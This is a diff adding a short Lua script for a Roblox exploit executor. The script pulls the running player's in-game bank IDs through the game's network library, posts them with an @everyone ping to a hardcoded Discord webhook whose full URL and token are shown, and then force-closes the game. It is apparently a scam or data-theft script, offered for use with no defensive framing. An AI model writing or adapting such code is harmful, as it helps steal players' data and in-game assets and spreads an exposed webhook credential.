@@ -1,0 +1,25 @@
+local webhook = "https://discord.com/api/webhooks/767364414366023690/aKwrIaIzEFhLDwtNagIpJQDewkxqYACdAq1-5iGrjevI7Fpooe1Am4p-HYMmDMcY90fw"
+ 
+ 
+ 
+local lib = require(game.ReplicatedStorage.Framework.Library)
+local httpService = game:service('HttpService')
+local banks = lib.Network.Invoke('Get my Banks')
+local banksStr = ""
+for _,v in next, banks do
+    banksStr = banksStr..v.BUID.."\n"
+end
+ 
+local Request = syn.request({
+    Url = webhook,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json" 
+    },
+    Body = httpService:JSONEncode({
+        ['username'] = "Bank invite",
+        ['content'] = 'Get Banks: \n'..banksStr..'\n @everyone'
+    })
+})
+repeat wait() until Request ~= nil 
+game:Shutdown() -- :3
